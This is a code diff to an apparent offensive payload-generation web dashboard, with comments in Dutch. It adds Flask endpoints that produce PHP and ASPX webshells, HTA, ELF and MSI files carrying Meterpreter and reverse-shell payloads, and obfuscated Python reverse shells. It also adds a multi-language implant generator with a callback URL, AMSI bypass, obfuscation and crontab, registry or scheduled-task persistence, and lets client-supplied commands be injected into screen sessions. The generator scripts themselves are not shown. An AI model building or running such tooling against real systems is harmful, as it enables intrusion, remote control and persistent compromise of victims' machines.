@@ -4,7 +4,9 @@ Ondersteunt meerdere generators (macro, meterpreter, meterpreter2) die
 elk een CLI script aanroepen als subprocess met msfvenom shellcode generatie.
 """
 
+import datetime
 import os
+import re as _re
 import subprocess
 import sys
 import tempfile
@@ -67,6 +69,38 @@ _POWERSHELL_PAYLOADS = [
     "windows/x64/shell_reverse_tcp",
     "windows/shell_reverse_tcp",
 ]
+
+_HTA_PAYLOADS = [
+    "windows/x64/meterpreter/reverse_https",
+    "windows/x64/meterpreter/reverse_tcp",
+    "windows/meterpreter/reverse_https",
+    "windows/meterpreter/reverse_tcp",
+    "windows/x64/shell_reverse_tcp",
+    "windows/shell_reverse_tcp",
+]
+
+_LINUX_ELF_PAYLOADS = [
+    "linux/x64/meterpreter/reverse_tcp",
+    "linux/x64/meterpreter_reverse_tcp",
+    "linux/x64/shell_reverse_tcp",
+    "linux/x64/meterpreter/reverse_https",
+    "linux/x86/meterpreter/reverse_tcp",
+    "linux/x86/shell_reverse_tcp",
+]
+
+_MSI_PAYLOADS = [
+    "windows/x64/meterpreter/reverse_https",
+    "windows/x64/meterpreter/reverse_tcp",
+    "windows/meterpreter/reverse_https",
+    "windows/meterpreter/reverse_tcp",
+    "windows/x64/shell_reverse_tcp",
+    "windows/shell_reverse_tcp",
+]
+
+_PYREVSHELL_PLATFORMS = ["linux", "windows"]
+_PYREVSHELL_MODES = ["plain", "obfuscated"]
+
+_ALLOWED_FEATURES = {"upload", "filebrowser"}
 
 # Bekende generators en hun scripts
 _GENERATORS = {
@@ -262,6 +296,48 @@ def invokeshellcode_dashboard():
 def reverseshells_dashboard():
     _ensure_access()
     return render_template("reverseshells.html")
+
+
+@macro_bp.route("/dashboard/phpshell", methods=["GET"])
+def phpshell_dashboard():
+    _ensure_access()
+    return render_template("phpshell.html")
+
+
+@macro_bp.route("/dashboard/hta", methods=["GET"])
+def hta_dashboard():
+    _ensure_access()
+    return render_template("hta.html", payloads=_HTA_PAYLOADS)
+
+
+@macro_bp.route("/dashboard/linux_elf", methods=["GET"])
+def linux_elf_dashboard():
+    _ensure_access()
+    return render_template("linux_elf.html", payloads=_LINUX_ELF_PAYLOADS)
+
+
+@macro_bp.route("/dashboard/aspxshell", methods=["GET"])
+def aspxshell_dashboard():
+    _ensure_access()
+    return render_template("aspxshell.html")
+
+
+@macro_bp.route("/dashboard/pyrevshell", methods=["GET"])
+def pyrevshell_dashboard():
+    _ensure_access()
+    return render_template("pyrevshell.html")
+
+
+@macro_bp.route("/dashboard/msi_payload", methods=["GET"])
+def msi_payload_dashboard():
+    _ensure_access()
+    return render_template("msi_payload.html", payloads=_MSI_PAYLOADS)
+
+
+@macro_bp.route("/dashboard/agentgen", methods=["GET"])
+def agentgen_dashboard():
+    _ensure_access()
+    return render_template("agentgen.html")
 
 
 # ---------------------------------------------------------------------------
@@ -599,11 +675,369 @@ def reverseshells_generate():
     return jsonify({"run_id": run_id})
 
 
+@macro_bp.route("/api/phpshell/generate", methods=["POST"])
+def phpshell_generate():
+    """Start PHP webshell generatie."""
+    _ensure_access()
+
+    password = request.form.get("password", "").strip()
+    if not password:
+        return jsonify({"error": "password is verplicht"}), 400
+
+    password_field = request.form.get("password_field", "k").strip() or "k"
+    # Sanitize: alleen alfanumeriek en underscore
+    if not all(c.isalnum() or c == "_" for c in password_field):
+        return jsonify({"error": "Veldnaam mag alleen letters, cijfers en _ bevatten"}), 400
+
+    features = request.form.getlist("features")
+    for f in features:
+        if f not in _ALLOWED_FEATURES:
+            return jsonify({"error": f"Onbekende feature: {f}"}), 400
+
+    cmd = [sys.executable, "phpshell.py", password, password_field]
+    for f in features:
+        cmd.append(f"--{f}")
+
+    output_paths = [
+        str(Path.cwd() / "http" / "payloads" / "shell.php"),
+    ]
+
+    run_id = str(uuid.uuid4())
+    thread = threading.Thread(
+        target=_run_generator_task,
+        args=(run_id, cmd, output_paths),
+        daemon=True,
+    )
+    thread.start()
+    return jsonify({"run_id": run_id})
+
+
+@macro_bp.route("/api/hta/generate", methods=["POST"])
+def hta_generate():
+    """Start HTA payload generatie."""
+    _ensure_access()
+
+    lhost = request.form.get("lhost", "").strip()
+    if not lhost:
+        return jsonify({"error": "lhost is verplicht"}), 400
+
+    lport = request.form.get("lport", "443").strip() or "443"
+    _, err = _validate_port(lport)
+    if err:
+        return jsonify({"error": err}), 400
+
+    payload = request.form.get("payload", "windows/x64/meterpreter/reverse_https").strip()
+    if payload not in _HTA_PAYLOADS:
+        return jsonify({"error": f"Onbekend payload type: {payload}"}), 400
+
+    mode = request.form.get("mode", "cradle").strip()
+    if mode not in ("cradle", "embedded"):
+        return jsonify({"error": f"Ongeldige modus: {mode}"}), 400
+
+    cmd = [sys.executable, "hta.py", lhost, lport, payload, mode]
+
+    output_paths = [
+        str(Path.cwd() / "http" / "payloads" / "payload.hta"),
+    ]
+
+    run_id = str(uuid.uuid4())
+    thread = threading.Thread(
+        target=_run_generator_task,
+        args=(run_id, cmd, output_paths),
+        daemon=True,
+    )
+    thread.start()
+    return jsonify({"run_id": run_id})
+
+
+@macro_bp.route("/api/linux_elf/generate", methods=["POST"])
+def linux_elf_generate():
+    """Start Linux ELF generatie via msfvenom."""
+    _ensure_access()
+
+    lhost = request.form.get("lhost", "").strip()
+    if not lhost:
+        return jsonify({"error": "lhost is verplicht"}), 400
+
+    lport = request.form.get("lport", "443").strip() or "443"
+    _, err = _validate_port(lport)
+    if err:
+        return jsonify({"error": err}), 400
+
+    payload = request.form.get("payload", "linux/x64/meterpreter/reverse_tcp").strip()
+    if payload not in _LINUX_ELF_PAYLOADS:
+        return jsonify({"error": f"Onbekend payload type: {payload}"}), 400
+
+    bestand = request.form.get("bestand", "shell").strip() or "shell"
+    if not all(c.isalnum() or c in "_-" for c in bestand):
+        return jsonify({"error": "Bestandsnaam mag alleen letters, cijfers, _ en - bevatten"}), 400
+    if ".." in bestand or "/" in bestand:
+        return jsonify({"error": "Ongeldige bestandsnaam"}), 400
+
+    cmd = [sys.executable, "linux_elf.py", lhost, lport, payload, bestand]
+
+    output_paths = [
+        str(Path.cwd() / "http" / "payloads" / f"{bestand}.elf"),
+    ]
+
+    run_id = str(uuid.uuid4())
+    thread = threading.Thread(
+        target=_run_generator_task,
+        args=(run_id, cmd, output_paths),
+        daemon=True,
+    )
+    thread.start()
+    return jsonify({"run_id": run_id})
+
+
+@macro_bp.route("/api/aspxshell/generate", methods=["POST"])
+def aspxshell_generate():
+    """Start ASPX webshell generatie."""
+    _ensure_access()
+
+    password = request.form.get("password", "").strip()
+    if not password:
+        return jsonify({"error": "password is verplicht"}), 400
+
+    password_field = request.form.get("password_field", "k").strip() or "k"
+    if not all(c.isalnum() or c == "_" for c in password_field):
+        return jsonify({"error": "Veldnaam mag alleen letters, cijfers en _ bevatten"}), 400
+
+    features = request.form.getlist("features")
+    for f in features:
+        if f not in _ALLOWED_FEATURES:
+            return jsonify({"error": f"Onbekende feature: {f}"}), 400
+
+    cmd = [sys.executable, "aspxshell.py", password, password_field]
+    for f in features:
+        cmd.append(f"--{f}")
+
+    output_paths = [
+        str(Path.cwd() / "http" / "payloads" / "shell.aspx"),
+    ]
+
+    run_id = str(uuid.uuid4())
+    thread = threading.Thread(
+        target=_run_generator_task,
+        args=(run_id, cmd, output_paths),
+        daemon=True,
+    )
+    thread.start()
+    return jsonify({"run_id": run_id})
+
+
+@macro_bp.route("/api/pyrevshell/generate", methods=["POST"])
+def pyrevshell_generate():
+    """Start Python reverse shell generatie."""
+    _ensure_access()
+
+    lhost = request.form.get("lhost", "").strip()
+    if not lhost:
+        return jsonify({"error": "lhost is verplicht"}), 400
+
+    lport = request.form.get("lport", "443").strip() or "443"
+    _, err = _validate_port(lport)
+    if err:
+        return jsonify({"error": err}), 400
+
+    mode = request.form.get("mode", "plain").strip()
+    if mode not in _PYREVSHELL_MODES:
+        return jsonify({"error": f"Ongeldige modus: {mode}"}), 400
+
+    platform = request.form.get("platform", "linux").strip()
+    if platform not in _PYREVSHELL_PLATFORMS:
+        return jsonify({"error": f"Ongeldig platform: {platform}"}), 400
+
+    cmd = [sys.executable, "pyrevshell.py", lhost, lport, mode, platform]
+
+    pty = request.form.get("pty", "").strip()
+    if pty:
+        cmd.append("--pty")
+
+    output_paths = [
+        str(Path.cwd() / "http" / "payloads" / "revshell.py"),
+    ]
+
+    run_id = str(uuid.uuid4())
+    thread = threading.Thread(
+        target=_run_generator_task,
+        args=(run_id, cmd, output_paths),
+        daemon=True,
+    )
+    thread.start()
+    return jsonify({"run_id": run_id})
+
+
+@macro_bp.route("/api/msi_payload/generate", methods=["POST"])
+def msi_payload_generate():
+    """Start MSI installer payload generatie via msfvenom."""
+    _ensure_access()
+
+    lhost = request.form.get("lhost", "").strip()
+    if not lhost:
+        return jsonify({"error": "lhost is verplicht"}), 400
+
+    lport = request.form.get("lport", "443").strip() or "443"
+    _, err = _validate_port(lport)
+    if err:
+        return jsonify({"error": err}), 400
+
+    payload = request.form.get("payload", "windows/x64/meterpreter/reverse_https").strip()
+    if payload not in _MSI_PAYLOADS:
+        return jsonify({"error": f"Onbekend payload type: {payload}"}), 400
+
+    bestand = request.form.get("bestand", "installer").strip() or "installer"
+    if not all(c.isalnum() or c in "_-" for c in bestand):
+        return jsonify({"error": "Bestandsnaam mag alleen letters, cijfers, _ en - bevatten"}), 400
+    if ".." in bestand or "/" in bestand:
+        return jsonify({"error": "Ongeldige bestandsnaam"}), 400
+
+    cmd = [sys.executable, "msi_payload.py", lhost, lport, payload, bestand]
+
+    output_paths = [
+        str(Path.cwd() / "http" / "payloads" / f"{bestand}.msi"),
+    ]
+
+    run_id = str(uuid.uuid4())
+    thread = threading.Thread(
+        target=_run_generator_task,
+        args=(run_id, cmd, output_paths),
+        daemon=True,
+    )
+    thread.start()
+    return jsonify({"run_id": run_id})
+
+
+_AGENT_LANGUAGES = ["bash", "powershell", "python", "csharp", "go", "rust", "ruby"]
+_AGENT_PERSIST_METHODS = ["crontab", "registry", "schtasks"]
+_AGENT_PERSIST_VALID = {
+    "bash": ["crontab"],
+    "powershell": ["registry", "schtasks"],
+    "python": ["crontab", "registry", "schtasks"],
+    "csharp": ["registry", "schtasks"],
+    "go": ["crontab", "schtasks"],
+    "rust": ["crontab"],
+    "ruby": ["crontab"],
+}
+
+
+@macro_bp.route("/api/agentgen/generate", methods=["POST"])
+def agentgen_generate():
+    """Start agent script generatie."""
+    _ensure_access()
+
+    callback = request.form.get("callback", "").strip()
+    if not callback:
+        return jsonify({"error": "callback URL is verplicht"}), 400
+    if not callback.startswith(("http://", "https://")):
+        return jsonify({"error": "callback moet beginnen met http:// of https://"}), 400
+
+    language = request.form.get("language", "bash").strip()
+    if language not in _AGENT_LANGUAGES:
+        return jsonify({"error": f"Ongeldige taal: {language}"}), 400
+
+    freq = request.form.get("freq", "3").strip() or "3"
+    try:
+        freq_num = int(freq)
+        if not (1 <= freq_num <= 3600):
+            raise ValueError
+    except ValueError:
+        return jsonify({"error": "Ongeldige frequentie (1-3600 seconden)"}), 400
+
+    label = request.form.get("label", "").strip()
+    if label and not all(c.isalnum() or c in "_-" for c in label):
+        return jsonify({"error": "Label mag alleen letters, cijfers, _ en - bevatten"}), 400
+
+    # Nieuwe opties
+    amsi = bool(request.form.get("amsi", "").strip())
+    obfuscate = bool(request.form.get("obfuscate", "").strip())
+    persist = request.form.get("persist", "").strip()
+    proxy_aware = bool(request.form.get("proxy_aware", "").strip())
+    proxy_url = request.form.get("proxy", "").strip()
+
+    # Jitter validatie
+    jitter = request.form.get("jitter", "0").strip() or "0"
+    try:
+        jitter_num = int(jitter)
+        if not (0 <= jitter_num <= 50):
+            raise ValueError
+    except ValueError:
+        return jsonify({"error": "Ongeldige jitter (0-50)"}), 400
+
+    # Killdate validatie
+    killdate = request.form.get("killdate", "").strip()
+    if killdate:
+        if not _re.match(r"^\d{4}-\d{2}-\d{2}$", killdate):
+            return jsonify({"error": "Killdate moet in YYYY-MM-DD formaat zijn"}), 400
+        try:
+            datetime.date.fromisoformat(killdate)
+        except ValueError:
+            return jsonify({"error": "Ongeldige killdate"}), 400
+
+    # Retry max validatie
+    retry_max = request.form.get("retry_max", "5").strip() or "5"
+    try:
+        retry_max_num = int(retry_max)
+        if not (1 <= retry_max_num <= 20):
+            raise ValueError
+    except ValueError:
+        return jsonify({"error": "Ongeldige retry-max (1-20)"}), 400
+
+    # Validatie: amsi alleen voor powershell
+    if amsi and language != "powershell":
+        return jsonify({"error": "AMSI bypass is alleen beschikbaar voor PowerShell"}), 400
+
+    # Validatie: persistentie methode moet geldig zijn voor de gekozen taal
+    if persist:
+        if persist not in _AGENT_PERSIST_METHODS:
+            return jsonify({"error": f"Ongeldige persistentie methode: {persist}"}), 400
+        if persist not in _AGENT_PERSIST_VALID.get(language, []):
+            return jsonify({"error": f"Persistentie '{persist}' is niet beschikbaar voor {language}"}), 400
+
+    # Validatie: proxy URL moet beginnen met http:// of https://
+    if proxy_url and not proxy_url.startswith(("http://", "https://")):
+        return jsonify({"error": "Proxy URL moet beginnen met http:// of https://"}), 400
+
+    cmd = [sys.executable, "agentgen.py", callback, language, "--freq", freq]
+    if label:
+        cmd.extend(["--label", label])
+    if amsi:
+        cmd.append("--amsi")
+    if obfuscate:
+        cmd.append("--obfuscate")
+    if persist:
+        cmd.extend(["--persist", persist])
+    if proxy_aware:
+        if proxy_url:
+            cmd.extend(["--proxy", proxy_url])
+        else:
+            cmd.append("--proxy")
+    if jitter_num > 0:
+        cmd.extend(["--jitter", jitter])
+    if killdate:
+        cmd.extend(["--killdate", killdate])
+    if retry_max_num != 5:
+        cmd.extend(["--retry-max", retry_max])
+
+    ext_map = {
+        "bash": "agent.sh", "powershell": "agent.ps1", "python": "agent.py",
+        "csharp": "agent.cs", "go": "agent.go", "rust": "agent.rs", "ruby": "agent.rb",
+    }
+    output_paths = [str(Path.cwd() / "http" / "payloads" / ext_map[language])]
+
+    run_id = str(uuid.uuid4())
+    thread = threading.Thread(
+        target=_run_generator_task,
+        args=(run_id, cmd, output_paths),
+        daemon=True,
+    )
+    thread.start()
+    return jsonify({"run_id": run_id})
+
+
 # ---------------------------------------------------------------------------
 # Reverse shells: bestaande bestanden ophalen
 # ---------------------------------------------------------------------------
-
-import re as _re
 
 _RE_SHELL_FILE = _re.compile(r"^[a-zA-Z0-9_\-]+_\d+\.txt$")
 
@@ -743,6 +1177,7 @@ def macro_download_compat(run_id):
 
 _RE_CMD_NAME = _re.compile(r"^[a-zA-Z0-9_\-]+$")
 _RE_SCREEN_NAME = _re.compile(r"^[a-zA-Z0-9_.\-]+$")
+_MAX_INJECT_CONTENT = 50 * 1024  # 50 KB
 
 
 @macro_bp.route("/dashboard/commands", methods=["GET"])
@@ -820,25 +1255,32 @@ def commands_inject():
     if not _RE_CMD_NAME.match(command_name):
         return jsonify({"error": "Ongeldige command naam"}), 400
 
-    # Lees command bestand
-    cmd_path = Path.cwd() / "http" / "commands" / command_name
-    if not cmd_path.is_file():
-        return jsonify({"error": f"Command '{command_name}' niet gevonden"}), 404
+    # Client kan bewerkte content meesturen (vanuit inject modal)
+    client_content = payload.get("content")
+    if isinstance(client_content, str) and client_content.strip():
+        if len(client_content) > _MAX_INJECT_CONTENT:
+            return jsonify({"error": f"Content te groot (max {_MAX_INJECT_CONTENT // 1024}KB)"}), 400
+        content = client_content.strip()
+    else:
+        # Bestaand gedrag: lees van disk + replacements
+        cmd_path = Path.cwd() / "http" / "commands" / command_name
+        if not cmd_path.is_file():
+            return jsonify({"error": f"Command '{command_name}' niet gevonden"}), 404
 
-    try:
-        content = cmd_path.read_text(errors="replace").strip()
-    except OSError as exc:
-        return jsonify({"error": f"Kan command niet lezen: {exc}"}), 500
+        try:
+            content = cmd_path.read_text(errors="replace").strip()
+        except OSError as exc:
+            return jsonify({"error": f"Kan command niet lezen: {exc}"}), 500
 
-    # Optionele find/replace op content voor injectie
-    replacements = payload.get("replacements")
-    if isinstance(replacements, list):
-        for r in replacements:
-            if isinstance(r, dict):
-                find = r.get("find", "")
-                replace = r.get("replace", "")
-                if find:
-                    content = content.replace(find, replace)
+        # Optionele find/replace op content voor injectie
+        replacements = payload.get("replacements")
+        if isinstance(replacements, list):
+            for r in replacements:
+                if isinstance(r, dict):
+                    find = r.get("find", "")
+                    replace = r.get("replace", "")
+                    if find:
+                        content = content.replace(find, replace)
 
     # Injecteer in screen sessie
     try:
